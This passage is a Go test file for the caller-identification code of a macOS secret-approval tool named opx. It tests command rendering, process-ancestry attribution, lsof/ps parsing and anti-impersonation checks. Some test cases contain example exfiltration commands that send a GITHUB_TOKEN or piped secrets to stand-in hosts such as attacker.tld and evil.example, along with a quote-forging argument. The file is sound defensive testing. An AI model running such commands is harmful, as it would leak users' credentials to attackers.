package caller_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bestdan/opx/internal/caller"
)

func TestName_NonEmpty(t *testing.T) {
	name := caller.Name()
	if name == "" {
		t.Error("caller.Name() returned empty string, want a process name")
	}
}

func TestName_NoSlash(t *testing.T) {
	// The returned name must be a plain executable name, not a path.
	name := caller.Name()
	if strings.Contains(name, "/") {
		t.Errorf("caller.Name() = %q, must not contain a path separator", name)
	}
}

func TestDescribe_NonEmpty(t *testing.T) {
	desc := caller.Describe()
	if desc == "" {
		t.Error("caller.Describe() returned empty string, want a label")
	}
}

func TestIsUninteresting(t *testing.T) {
	cases := []struct {
		comm string
		want bool
	}{
		{"sh", true},
		{"bash", true},
		{"zsh", true},
		{"fish", true},
		{"dash", true},
		{"ksh", true},
		{"csh", true},
		{"tcsh", true},
		{"login", true},
		{"ghostty", true},
		{"iterm2", true},
		{"iterm", true},
		{"Terminal", true},
		{"alacritty", true},
		{"kitty", true},
		{"wezterm", true},
		{"wezterm-gui", true},
		{"warp", true},
		{"warpterminal", true},
		{"hyper", true},
		{"tmux", true},
		{"tmux: server", true},
		{"tmux: client", true},
		{"screen", true},
		{"konsole", true},
		{"gnome-terminal", true},
		{"xterm", true},
		{"urxvt", true},
		{"st", true},
		{"foot", true},
		{"code", true},
		{"cursor", true},
		{"windsurf", true},
		{"python3", false},
		{"node", false},
		{"claude", false},
		{"", false},
	}
	for _, tc := range cases {
		t.Run(tc.comm, func(t *testing.T) {
			if got := caller.IsUninterestingForTest(tc.comm); got != tc.want {
				t.Errorf("IsUninterestingForTest(%q) = %v, want %v", tc.comm, got, tc.want)
			}
		})
	}
}

func TestIsUninteresting_CaseInsensitive(t *testing.T) {
	cases := []string{"GHOSTTY", "iTerm2", "ITERM2", "TERMINAL", "Alacritty", "KITTY", "Tmux", "CODE"}
	for _, comm := range cases {
		t.Run(comm, func(t *testing.T) {
			if !caller.IsUninterestingForTest(comm) {
				t.Errorf("IsUninterestingForTest(%q) = false, want true (case-insensitive match)", comm)
			}
		})
	}
}

func TestRenderArgv(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want string
	}{
		{
			name: "basename argv0 only",
			argv: []string{"/usr/bin/python3"},
			want: "python3",
		},
		{
			name: "path args shortened",
			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
			want: "python3 linear-archive.py --team PreThink",
		},
		{
			name: "non-path args kept as-is",
			argv: []string{"node", "--flag", "value"},
			want: "node --flag value",
		},
		{
			name: "single arg no path",
			argv: []string{"claude"},
			want: "claude",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := caller.RenderArgvForTest(tc.argv); got != tc.want {
				t.Errorf("RenderArgvForTest(%v) = %q, want %q", tc.argv, got, tc.want)
			}
		})
	}
}

func TestDescribeArgv_SingleTokenNoPrefix(t *testing.T) {
	// A single-token argv (no arguments) has nothing to describe beyond the
	// name the dialog header already shows, so no ancestor prefix should be
	// added even when an interesting ancestor is present above it.
	got := caller.DescribeArgvForTest("", []string{"claude"}, []string{"ghostty", "login-wrapper"})
	if got != "claude" {
		t.Errorf("DescribeArgvForTest with single-token argv = %q, want %q (no ancestor prefix)", got, "claude")
	}
}

func TestDescribeArgv_MultiTokenGetsPrefix(t *testing.T) {
	got := caller.DescribeArgvForTest(
		"",
		[]string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
		[]string{"ghostty", "claude"},
	)
	want := "claude › python3 linear-archive.py --team PreThink"
	if got != want {
		t.Errorf("DescribeArgvForTest = %q, want %q", got, want)
	}
}

func TestDescribeArgv_SkipsUninterestingAncestors(t *testing.T) {
	got := caller.DescribeArgvForTest(
		"",
		[]string{"node", "--flag"},
		[]string{"ghostty", "tmux", "bash"},
	)
	want := "node --flag"
	if got != want {
		t.Errorf("DescribeArgvForTest = %q, want %q (all ancestors uninteresting)", got, want)
	}
}

// TestRenderCommand pins the run-mode contract: this line is the only place
// the user learns which process receives the plaintext secrets, so it keeps
// every part of the destination. The previous behaviour — basename argv[0]
// and every path-looking argument — is the vulnerability, not a baseline.
func TestRenderCommand(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want string
	}{
		{
			name: "keeps the full path of the binary and its arguments",
			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
			want: "/usr/bin/python3 /home/user/linear-archive.py --team PreThink",
		},
		{
			name: "keeps an attacker-controlled binary path visible",
			argv: []string{"/tmp/.cache/pytest"},
			want: "/tmp/.cache/pytest",
		},
		{
			name: "keeps the exfiltration host visible",
			argv: []string{"curl", "-d", "@-", "https://attacker.tld/collect"},
			want: "curl -d @- https://attacker.tld/collect",
		},
		{
			name: "keeps a sh -c payload whole and quoted as one argument",
			argv: []string{"sh", "-c", `curl -sd "$GITHUB_TOKEN" https://evil.example/x`},
			want: `sh -c "curl -sd \"$GITHUB_TOKEN\" https://evil.example/x"`,
		},
		{
			name: "quotes an empty argument so it is not invisible",
			argv: []string{"cmd", "", "next"},
			want: `cmd "" next`,
		},
		{
			name: "escapes a backslash so it cannot forge a closing quote",
			argv: []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`},
			want: `curl -d @secrets "https://evil.example/\\\" https://api.github.com/upload"`,
		},
		{
			name: "a backslash alone is enough to require quoting",
			argv: []string{"cmd", `a\b`},
			want: `cmd "a\\b"`,
		},
		{
			name: "empty argv renders empty",
			argv: nil,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := caller.RenderCommand(tc.argv); got != tc.want {
				t.Errorf("RenderCommand(%v) =\n%q\nwant\n%q", tc.argv, got, tc.want)
			}
		})
	}
}

// TestRenderCommand_QuotingIsUnambiguous states the property the exact-match
// cases above only imply: an attacker-supplied argument cannot close its own
// display quote early. Escaping `"` while leaving `\` alone rendered
// `https://evil.example/\" …` as `…/\\" …`, where the `\\` reads as an escaped
// backslash and the `"` behind it as the terminator — the approver sees the
// argument end at evil.example and the next token, api.github.com, as the
// destination. It is not; the child receives one argument pointing at
// evil.example.
//
// Counting terminators rather than comparing bytes is deliberate: any future
// escaping scheme that keeps boundaries honest passes, and any that reopens
// this hole fails, whatever it renders.
func TestRenderCommand_QuotingIsUnambiguous(t *testing.T) {
	argv := []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`}

	got := caller.RenderCommand(argv)

	if n := countUnescapedQuotes(got); n != 2 {
		t.Errorf("rendered argument must have exactly one opening and one closing quote, found %d in %q", n, got)
	}
	if !strings.Contains(got, "https://evil.example/") || !strings.Contains(got, "https://api.github.com/upload") {
		t.Errorf("both halves of the argument must still be legible; got %q", got)
	}
}

// countUnescapedQuotes counts the double quotes in s that a reader would treat
// as quote delimiters — i.e. those not preceded by an odd number of
// backslashes.
func countUnescapedQuotes(s string) int {
	n, backslashes := 0, 0
	for _, r := range s {
		switch r {
		case '\\':
			backslashes++
		case '"':
			if backslashes%2 == 0 {
				n++
			}
			backslashes = 0
		default:
			backslashes = 0
		}
	}
	return n
}

// TestRenderCommand_ElisionIsExplicit covers F10: a bare trailing "…" reads as
// cosmetic, so an approver cannot tell that arguments were dropped. The count
// must be present and correct.
func TestRenderCommand_ElisionIsExplicit(t *testing.T) {
	max := caller.MaxChildCommandForTest()
	argv := []string{"deploy.sh", strings.Repeat("a", max-20), "--dropped-one", "--dropped-two"}

	got := caller.RenderCommand(argv)

	if !strings.Contains(got, "+2 more arguments") {
		t.Errorf("elision must name how many arguments were dropped; got %q", got)
	}
	if strings.HasSuffix(got, "…") {
		t.Errorf("elision must not be a bare ellipsis; got %q", got)
	}
	if strings.Contains(got, "--dropped-two") {
		t.Errorf("argument past the budget should not have been rendered; got %q", got)
	}

	// Singular reads correctly too — an off-by-one in the count is exactly the
	// kind of detail an approver would (rightly) stop trusting.
	one := caller.RenderCommand([]string{"deploy.sh", strings.Repeat("a", max-20), "--only-dropped"})
	if !strings.Contains(one, "+1 more argument") || strings.Contains(one, "+1 more arguments") {
		t.Errorf("singular elision phrasing wrong; got %q", one)
	}
}

// TestRenderCommand_NeverTruncatesArgv0 keeps the most decision-relevant
// token whole: a path long enough to blow the budget is precisely the one
// worth reading.
func TestRenderCommand_NeverTruncatesArgv0(t *testing.T) {
	max := caller.MaxChildCommandForTest()
	long := "/tmp/" + strings.Repeat("d/", max) + "evil"
	argv := []string{long, "--flag"}

	got := caller.RenderCommand(argv)

	if !strings.HasPrefix(got, long) {
		t.Errorf("argv[0] must render in full; got %q", got)
	}
	if !strings.Contains(got, "+1 more argument") {
		t.Errorf("dropped arguments must still be counted; got %q", got)
	}
}

// TestRenderCommand_AncestorRenderingUnchanged guards the split: the ancestor
// path keeps its basename shortening, and the two must not be reunified.
func TestRenderCommand_AncestorRenderingUnchanged(t *testing.T) {
	argv := []string{"/usr/bin/python3", "/home/user/script.py", "--flag"}

	ancestor := caller.RenderArgvForTest(argv)
	if ancestor != "python3 script.py --flag" {
		t.Errorf("ancestor rendering changed: %q", ancestor)
	}
	if child := caller.RenderCommand(argv); child == ancestor {
		t.Errorf("child and ancestor renderings must differ; both = %q", child)
	}
}

func TestTruncate(t *testing.T) {
	cases := []struct {
		name string
		s    string
		n    int
		want string
	}{
		{"under limit unchanged", "short string", 120, "short string"},
		{"exact limit unchanged", strings.Repeat("a", 120), 120, strings.Repeat("a", 120)},
		{"over limit cut with ellipsis", strings.Repeat("a", 130), 120, strings.Repeat("a", 119) + "…"},
		{"empty string", "", 120, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := caller.TruncateForTest(tc.s, tc.n)
			if got != tc.want {
				t.Errorf("TruncateForTest(%q, %d) = %q, want %q", tc.s, tc.n, got, tc.want)
			}
			if n := len([]rune(got)); n > tc.n {
				t.Errorf("TruncateForTest result has %d runes, want <= %d", n, tc.n)
			}
		})
	}
}

// writeFakePS creates a file at dir/name with the given permission bits and
// returns its path. It stands in for the ps binary; nothing execs it.
func writeFakePS(t *testing.T, dir, name string, perm os.FileMode) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte("#!/bin/sh\necho '1 claude'\n"), perm); err != nil {
		t.Fatalf("writing fake ps: %v", err)
	}
	// WriteFile's perm is masked by umask; set the bits we actually asked for.
	if err := os.Chmod(path, perm); err != nil {
		t.Fatalf("chmod fake ps: %v", err)
	}
	return path
}

// TestPSPath_Rejects covers every way a candidate fails to qualify. ps is the
// only source of caller identity, so a ps another account could have written
// gets to name whichever program the dialog attributes the read to.
func TestResolveTool_Rejects(t *testing.T) {
	dir := t.TempDir()

	subdir := filepath.Join(dir, "adir")
	if err := os.Mkdir(subdir, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	cases := []struct {
		name      string
		candidate string
	}{
		{"missing", filepath.Join(dir, "nope")},
		{"directory", subdir},
		{"not executable", writeFakePS(t, dir, "noexec", 0o644)},
		{"group writable", writeFakePS(t, dir, "grpw", 0o775)},
		{"world writable", writeFakePS(t, dir, "worldw", 0o757)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := caller.ResolveToolForTest([]string{tc.candidate}); got != "" {
				t.Errorf("resolveTool accepted %s candidate: %q", tc.name, got)
			}
		})
	}
}

// TestPSPath_AcceptsCleanExecutable is the positive case: a regular 0755 file
// is what the packaged /bin/ps looks like.
func TestResolveTool_AcceptsCleanExecutable(t *testing.T) {
	dir := t.TempDir()
	path := writeFakePS(t, dir, "ps", 0o755)

	if got := caller.ResolveToolForTest([]string{path}); got != path {
		t.Errorf("resolveTool() = %q, want %q", got, path)
	}
}

// TestPSPath_FirstMatchWins pins the preference order: candidates are tried in
// list order, and an unusable earlier entry is skipped rather than aborting.
func TestResolveTool_FirstMatchWins(t *testing.T) {
	dir := t.TempDir()
	bad := writeFakePS(t, dir, "bad", 0o666)
	first := writeFakePS(t, dir, "first", 0o755)
	second := writeFakePS(t, dir, "second", 0o755)

	if got := caller.ResolveToolForTest([]string{first, second}); got != first {
		t.Errorf("resolveTool() = %q, want first candidate %q", got, first)
	}
	if got := caller.ResolveToolForTest([]string{bad, second}); got != second {
		t.Errorf("resolveTool() skipped past unusable candidate to %q, want %q", got, second)
	}
}

// TestPSPath_IgnoresPATH is the finding this change exists for: a ps reachable
// only through PATH must never be selected. PATH is set by the process opx is
// prompting the user about, so a "ps" found there is the caller choosing the
// name the dialog attributes the secret request to.
func TestResolveTool_IgnoresPATH(t *testing.T) {
	dir := t.TempDir()
	writeFakePS(t, dir, "ps", 0o755)
	t.Setenv("PATH", dir)

	if got := caller.ResolveToolForTest([]string{"/nonexistent/ps"}); got != "" {
		t.Errorf("resolveTool consulted PATH and returned %q, want \"\"", got)
	}
}

// TestToolCandidates_AreAbsolute guards the compiled-in lists: a bare name
// would reintroduce PATH resolution at the exec.Command call.
func TestToolCandidates_AreAbsolute(t *testing.T) {
	for name, candidates := range map[string][]string{
		"ps":   caller.PSCandidatesForTest(),
		"lsof": caller.LsofCandidatesForTest(),
	} {
		if len(candidates) == 0 {
			t.Errorf("%s candidate list is empty", name)
		}
		for _, c := range candidates {
			if !filepath.IsAbs(c) {
				t.Errorf("%s candidate %q is not absolute", name, c)
			}
		}
	}
}

// TestPSEnv_IsMinimal pins the replacement environment. The point is that it
// replaces the inherited one rather than extending it, so the caller cannot
// steer ps through the environment either.
func TestToolEnv_IsMinimal(t *testing.T) {
	want := []string{"PATH=/bin:/usr/bin", "LC_ALL=C"}
	got := caller.ToolEnvForTest()
	if len(got) != len(want) {
		t.Fatalf("toolEnv = %q, want exactly %q", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("toolEnv[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}

// TestName_UnknownWhenNoPS is the degradation safety net. Since opx narrowed to
// macOS, ps is the only source of caller identity — there is no second path to
// fall back on — so when no trusted ps resolves, the honest answer is
// "unknown", not a hang, a panic, or a name from an untrusted binary.
func TestName_UnknownWhenNoPS(t *testing.T) {
	caller.WithPSCandidatesForTest(t, []string{"/nonexistent/ps"})

	if got := caller.Name(); got != "unknown" {
		t.Errorf("Name() = %q with no resolvable ps, want %q", got, "unknown")
	}
	if got := caller.Describe(); got != "unknown" {
		t.Errorf("Describe() = %q with no resolvable ps, want %q", got, "unknown")
	}
}

// TestIdentity_RendersKernelPath is the core of F6: the dialog must show where
// the calling executable actually lives, because that is the one part of its
// identity the process could not choose for itself. Each case asserts what the
// identity *renders as* — an implementation that dropped the name or the path
// would fail rather than pass by absence.
//
// No case expects a "suspicious location" marker: opx does not classify paths.
// See the Identity doc comment for why a location allowlist would fire on
// legitimate callers (real Claude Code lives under ~/.local/share).
func TestIdentity_RendersKernelPath(t *testing.T) {
	cases := []struct {
		name       string
		comm       string
		exe        string
		argv       []string
		wantName   string
		wantDetail string
	}{
		{
			name:       "conventional location",
			comm:       "claude",
			exe:        "/usr/local/bin/claude",
			argv:       []string{"claude", "--resume"},
			wantName:   "claude",
			wantDetail: "/usr/local/bin/claude --resume",
		},
		{
			name:       "cache directory is shown, not flagged",
			comm:       "claude",
			exe:        "/Users/x/.cache/claude",
			argv:       []string{"claude", "--resume"},
			wantName:   "claude",
			wantDetail: "/Users/x/.cache/claude --resume",
		},
		{
			name:       "app bundle path with a space survives intact",
			comm:       "Alfred",
			exe:        "/Applications/Alfred 5.app/Contents/MacOS/Alfred",
			argv:       []string{"/Applications/Alfred 5.app/Contents/MacOS/Alfred"},
			wantName:   "Alfred",
			wantDetail: "/Applications/Alfred 5.app/Contents/MacOS/Alfred",
		},
		{
			name:       "unknown path degrades to the comm-only rendering",
			comm:       "claude",
			exe:        "",
			argv:       []string{"claude", "--resume"},
			wantName:   "claude",
			wantDetail: "claude --resume",
		},
		{
			name:       "unknown path and no argv still names the caller",
			comm:       "claude",
			exe:        "",
			argv:       nil,
			wantName:   "claude",
			wantDetail: "claude",
		},
		{
			name:       "path without argv still renders the path",
			comm:       "claude",
			exe:        "/Users/x/.cache/claude",
			argv:       nil,
			wantName:   "claude",
			wantDetail: "/Users/x/.cache/claude",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			id := caller.IdentityForTest(tc.comm, tc.exe, tc.argv, nil)
			if id.Name != tc.wantName {
				t.Errorf("Name = %q, want %q", id.Name, tc.wantName)
			}
			if id.Path != tc.exe {
				t.Errorf("Path = %q, want %q", id.Path, tc.exe)
			}
			if id.Detail != tc.wantDetail {
				t.Errorf("Detail = %q, want %q", id.Detail, tc.wantDetail)
			}
		})
	}
}

// TestSubjectSelection_AndThroughLine is the attribution-laundering half of F6.
// Naming the right process is not a property that can be guaranteed — a real
// shell is both a legitimate ancestor and a plausible attacker — so two weaker
// properties are asserted instead: a process whose self-asserted comm the kernel
// contradicts is not walked past, and whatever *is* walked past is disclosed at
// its kernel path rather than absorbed.
//
// Chains are ordered nearest-to-opx first, the way ancestorChain builds them.
func TestSubjectSelection_AndThroughLine(t *testing.T) {
	cases := []struct {
		name        string
		chain       []caller.ProcessForTest
		wantName    string
		wantPath    string
		wantThrough []string
	}{
		{
			// The laundering case. Calling yourself `bash` used to be enough to
			// be skipped, handing attribution to the trusted program above.
			name: "comm says bash, kernel says /tmp/evil — evil is the subject",
			chain: []caller.ProcessForTest{
				{Comm: "bash", Exe: "/tmp/evil", Argv: []string{"bash"}},
				{Comm: "claude", Exe: "/usr/local/bin/claude"},
			},
			wantName: "evil",
			wantPath: "/tmp/evil",
		},
		{
			// A stock terminal chain. `login` is uid 0 and returns no txt vnode
			// to a same-user caller, so it must keep skipping — otherwise every
			// bare-terminal read would read `"login" wants to read`.
			name: "stock zsh ← login still names the interesting process",
			chain: []caller.ProcessForTest{
				{Comm: "zsh", Exe: "/bin/zsh"},
				{Comm: "claude", Exe: "/usr/local/bin/claude", Argv: []string{"claude"}},
				{Comm: "zsh", Exe: "/bin/zsh"},
				{Comm: "login", Exe: ""},
			},
			wantName: "claude",
			wantPath: "/usr/local/bin/claude",
			// The skipped /bin/zsh is SIP-sealed, so the dialog stays quiet.
			wantThrough: nil,
		},
		{
			// An honest shell somewhere an attacker can write to is skipped —
			// its comm and kernel path agree — but it is not hidden.
			name: "skipped shell outside SIP appears at its real path",
			chain: []caller.ProcessForTest{
				{Comm: "bash", Exe: "/Users/x/.cache/tools/bash"},
				{Comm: "zsh", Exe: "/bin/zsh"},
				{Comm: "claude", Exe: "/usr/local/bin/claude", Argv: []string{"claude"}},
			},
			wantName:    "claude",
			wantPath:    "/usr/local/bin/claude",
			wantThrough: []string{"/Users/x/.cache/tools/bash"},
		},
		{
			// Ordering is nearest-to-opx last, so the line reads in the
			// direction control flowed towards opx.
			name: "several skipped ancestors are ordered nearest-to-opx last",
			chain: []caller.ProcessForTest{
				{Comm: "zsh", Exe: "/opt/homebrew/bin/zsh"},
				{Comm: "bash", Exe: "/Users/x/.cache/tools/bash"},
				{Comm: "claude", Exe: "/usr/local/bin/claude", Argv: []string{"claude"}},
			},
			wantName:    "claude",
			wantPath:    "/usr/local/bin/claude",
			wantThrough: []string{"/Users/x/.cache/tools/bash", "/opt/homebrew/bin/zsh"},
		},
		{
			// Omission is what makes laundering work. An ancestor whose path
			// could not be read is still an ancestor the user gets to see.
			name: "unreadable skipped ancestor renders as unknown",
			chain: []caller.ProcessForTest{
				{Comm: "zsh", Exe: "/bin/zsh"},
				{Comm: "bash", Exe: ""},
				{Comm: "claude", Exe: "/usr/local/bin/claude", Argv: []string{"claude"}},
			},
			wantName:    "claude",
			wantPath:    "/usr/local/bin/claude",
			wantThrough: []string{"unknown"},
		},
		{
			// Nothing above the subject is on the line: the through line is
			// about what stands between the subject and opx, not about the
			// subject's own ancestry.
			name: "ancestors above the subject are not disclosed here",
			chain: []caller.ProcessForTest{
				{Comm: "claude", Exe: "/usr/local/bin/claude", Argv: []string{"claude"}},
				{Comm: "bash", Exe: "/Users/x/.cache/tools/bash"},
			},
			wantName:    "claude",
			wantPath:    "/usr/local/bin/claude",
			wantThrough: nil,
		},
		{
			// Every ancestor skippable: the walk falls back to the immediate
			// parent, which is then the subject rather than something walked
			// past, so there is nothing to disclose.
			name: "all-skippable chain names the parent and discloses nothing",
			chain: []caller.ProcessForTest{
				{Comm: "zsh", Exe: "/bin/zsh", Argv: []string{"zsh"}},
				{Comm: "login", Exe: ""},
			},
			wantName:    "zsh",
			wantPath:    "/bin/zsh",
			wantThrough: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			id := caller.IdentityFromChainForTest(tc.chain)
			if id.Name != tc.wantName {
				t.Errorf("Name = %q, want %q", id.Name, tc.wantName)
			}
			if id.Path != tc.wantPath {
				t.Errorf("Path = %q, want %q", id.Path, tc.wantPath)
			}
			if len(id.Through) != len(tc.wantThrough) {
				t.Fatalf("Through = %q, want %q", id.Through, tc.wantThrough)
			}
			for i, want := range tc.wantThrough {
				if id.Through[i] != want {
					t.Errorf("Through[%d] = %q, want %q", i, id.Through[i], want)
				}
			}
		})
	}
}

// TestSkippable_RequiresKernelCorroboration pins the gate itself: membership of
// `uninteresting` is a claim, and a claim the kernel contradicts is not enough
// to be walked past.
func TestSkippable_RequiresKernelCorroboration(t *testing.T) {
	cases := []struct {
		comm, exe string
		want      bool
		why       string
	}{
		{"zsh", "/bin/zsh", true, "comm and kernel agree"},
		{"zsh", "/BIN/ZSH", true, "basename comparison is case-insensitive, as the list match is"},
		{"bash", "/tmp/evil", false, "kernel contradicts the claim"},
		{"login", "", true, "unreadable path still skips — see skippable for why"},
		{"claude", "", false, "not a container process in the first place"},
		{"claude", "/bin/zsh", false, "not on the list; the kernel path does not put it there"},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			if got := caller.SkippableForTest(tc.comm, tc.exe); got != tc.want {
				t.Errorf("skippable(comm=%q, exe=%q) = %v, want %v", tc.comm, tc.exe, got, tc.want)
			}
		})
	}
}

// TestIsSIPSealed covers the through line's suppression predicate. The set is a
// fact about the platform, not a judgment about the user's layout: writes to
// these prefixes fail with "Operation not permitted" even for root (verified on
// macOS 26.4), so they are the locations an attacker cannot occupy. /usr/local
// is merely root-owned and must not be in the set.
func TestIsSIPSealed(t *testing.T) {
	sealed := []string{"/bin/zsh", "/sbin/launchd", "/usr/bin/login", "/usr/sbin/lsof", "/usr/libexec/rosetta/oahd", "/System/Library/x"}
	for _, path := range sealed {
		if !caller.IsSIPSealedForTest(path) {
			t.Errorf("isSIPSealed(%q) = false, want true", path)
		}
	}
	unsealed := []string{"/usr/local/bin/bash", "/opt/homebrew/bin/zsh", "/Users/x/.cache/tools/bash", "/tmp/evil", "/private/tmp/bin/sh", "/binary/evil", "/usr/bin", ""}
	for _, path := range unsealed {
		if caller.IsSIPSealedForTest(path) {
			t.Errorf("isSIPSealed(%q) = true, want false", path)
		}
	}
}

// TestIdentityName_PrefersExeOverComm is the impersonation signal. comm is
// self-asserted; exe is where the process actually lives. When they disagree,
// the verifiable half must win — a header reading "claude" for a binary at
// /tmp/evil is the exact lie F6 describes.
func TestIdentityName_PrefersExeOverComm(t *testing.T) {
	if got := caller.IdentityNameForTest("/tmp/evil/notclaude", "claude"); got != "notclaude" {
		t.Errorf("identityName(exe=/tmp/evil/notclaude, comm=claude) = %q, want %q", got, "notclaude")
	}
	if got := caller.IdentityNameForTest("", "claude"); got != "claude" {
		t.Errorf("identityName with no exe = %q, want the comm fallback %q", got, "claude")
	}
}

// TestParsePPIDComm covers the ps line parser. What it yields is the ppid and
// a basename — never the displayed path, which comes from the kernel via lsof
// (see exePath); macOS `ps -o comm=` echoes the process's own argv[0]. The
// space case is why the remainder is taken verbatim rather than re-joined from
// whitespace fields: a real app bundle has a space in its path, and a
// Fields/Join round trip would corrupt the basename taken from it.
func TestParsePPIDComm(t *testing.T) {
	cases := []struct {
		name     string
		out      string
		wantPPID int
		wantComm string
		wantOK   bool
	}{
		{
			name:     "plain path",
			out:      " 8149 /bin/zsh\n",
			wantPPID: 8149,
			wantComm: "zsh",
			wantOK:   true,
		},
		{
			name:     "path containing spaces is preserved exactly",
			out:      "    1 /Applications/Alfred 5.app/Contents/MacOS/Alfred\n",
			wantPPID: 1,
			wantComm: "Alfred",
			wantOK:   true,
		},
		{
			name:     "consecutive spaces are not collapsed",
			out:      "  42 /Users/x/two  spaces/app\n",
			wantPPID: 42,
			wantComm: "app",
			wantOK:   true,
		},
		{
			name:     "only the first line is used",
			out:      " 7 /bin/zsh\n 9 /bin/bash\n",
			wantPPID: 7,
			wantComm: "zsh",
			wantOK:   true,
		},
		{name: "empty output", out: "", wantOK: false},
		{name: "ppid only", out: "  42\n", wantOK: false},
		{name: "non-numeric ppid", out: "abc /bin/zsh\n", wantOK: false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ppid, comm, ok := caller.ParsePPIDCommForTest(tc.out)
			if ok != tc.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tc.wantOK)
			}
			if !ok {
				return
			}
			if ppid != tc.wantPPID {
				t.Errorf("ppid = %d, want %d", ppid, tc.wantPPID)
			}
			if comm != tc.wantComm {
				t.Errorf("comm = %q, want %q", comm, tc.wantComm)
			}
		})
	}
}

// TestDescribeArgv_ExeReplacesArgv0 pins that a verified path displaces the
// self-asserted argv[0] while the remaining arguments stay path-shortened,
// and that the ancestor prefix still applies.
func TestDescribeArgv_ExeReplacesArgv0(t *testing.T) {
	got := caller.DescribeArgvForTest(
		"/Users/x/.cache/claude",
		[]string{"claude", "/home/user/linear-archive.py", "--team", "PreThink"},
		[]string{"ghostty", "node"},
	)
	want := "node › /Users/x/.cache/claude linear-archive.py --team PreThink"
	if got != want {
		t.Errorf("DescribeArgvForTest = %q, want %q", got, want)
	}
}

// TestParseLsofTxt covers the parser for the one input opx actually trusts to
// name the calling process. `lsof -F pfn -d txt` emits a p<pid> line per
// process then repeating f/n pairs; the executable is the first txt entry in a
// section and the rest are linked libraries, so taking a later one would name
// dyld as the caller.
//
// Each case asserts the whole map, so an entry that should be absent (the
// unreadable process) fails rather than passing unnoticed alongside a correct
// one.
func TestParseLsofTxt(t *testing.T) {
	cases := []struct {
		name string
		out  string
		want map[int]string
	}{
		{
			name: "executable then dyld",
			out:  "p12943\nftxt\nn/usr/local/bin/claude\nftxt\nn/usr/lib/dyld\n",
			want: map[int]string{12943: "/usr/local/bin/claude"},
		},
		{
			name: "path containing spaces",
			out:  "p1\nftxt\nn/Applications/Alfred 5.app/Contents/MacOS/Alfred\nftxt\nn/usr/lib/dyld\n",
			want: map[int]string{1: "/Applications/Alfred 5.app/Contents/MacOS/Alfred"},
		},
		{
			name: "no txt entry (permission denied on another user's process)",
			out:  "p1\n",
			want: map[int]string{},
		},
		{
			name: "empty output",
			out:  "",
			want: map[int]string{},
		},
		{
			name: "relative path is rejected rather than half-understood",
			out:  "p1\nftxt\nnclaude\n",
			want: map[int]string{},
		},
		{
			name: "name line before any txt marker is not the executable",
			out:  "p1\nn/not/the/text/vnode\nftxt\nn/usr/local/bin/claude\n",
			want: map[int]string{1: "/usr/local/bin/claude"},
		},
		{
			// The whole point of the batch: several processes, each mapped to
			// its own first txt entry, with sections in lsof's order rather
			// than the order the pids were requested in. The 999999 entry
			// pins that a pid with no section reads as "" rather than
			// borrowing a neighbour's path.
			name: "multiple processes each get their own path",
			out: "p8837\nftxt\nn/Applications/Ghostty.app/Contents/MacOS/ghostty\nftxt\nn/usr/lib/dyld\n" +
				"p60233\nftxt\nn/bin/zsh\nftxt\nn/usr/share/locale/en_US.UTF-8/LC_COLLATE\n" +
				"p61115\nftxt\nn/Users/x/.local/share/claude/versions/2.1.220\n",
			want: map[int]string{
				8837:   "/Applications/Ghostty.app/Contents/MacOS/ghostty",
				60233:  "/bin/zsh",
				61115:  "/Users/x/.local/share/claude/versions/2.1.220",
				999999: "",
			},
		},
		{
			// A pid that yielded nothing is simply absent — this is the
			// ordinary case, since lsof reports nothing for a root-owned
			// `login` and still prints the sections it could resolve.
			name: "unreadable process is absent, its neighbours survive",
			out:  "p1\nftxt\nn/bin/zsh\np2\np3\nftxt\nn/tmp/evil\n",
			want: map[int]string{1: "/bin/zsh", 3: "/tmp/evil"},
		},
		{
			// A section whose files cannot be attributed to a pid must not be
			// folded into the previous process, which would name one process's
			// executable as another's.
			name: "unparseable section header does not leak into the previous pid",
			out:  "p1\nftxt\nn/bin/zsh\npNaN\nftxt\nn/tmp/evil\n",
			want: map[int]string{1: "/bin/zsh"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := caller.ParseLsofTxtForTest(tc.out)
			for pid, want := range tc.want {
				if got[pid] != want {
					t.Errorf("parseLsofTxt[%d] = %q, want %q", pid, got[pid], want)
				}
			}
			for pid, path := range got {
				if _, expected := tc.want[pid]; !expected {
					t.Errorf("parseLsofTxt returned unexpected pid %d = %q", pid, path)
				}
			}
		})
	}
}

// TestDescribeArgv_EmptyArgvWithExe pins that the helper does not panic on an
// empty argv. No production path reaches it that way — describeSubject checks
// first — but it did panic (slice bounds out of range [1:0]), and a helper
// that panics on an empty slice is a trap for the next caller.
func TestDescribeArgv_EmptyArgvWithExe(t *testing.T) {
	if got := caller.DescribeArgvForTest("/usr/local/bin/claude", nil, nil); got != "/usr/local/bin/claude" {
		t.Errorf("DescribeArgvForTest with empty argv = %q, want %q", got, "/usr/local/bin/claude")
	}
	if got := caller.DescribeArgvForTest("", nil, nil); got != "" {
		t.Errorf("DescribeArgvForTest with empty argv and no exe = %q, want %q", got, "")
	}
}

// TestParseLsofTxt_NamelessFirstRecordIsNotSkipped is the misattribution
// guard. If the first txt record carries no name, continuing to the next one
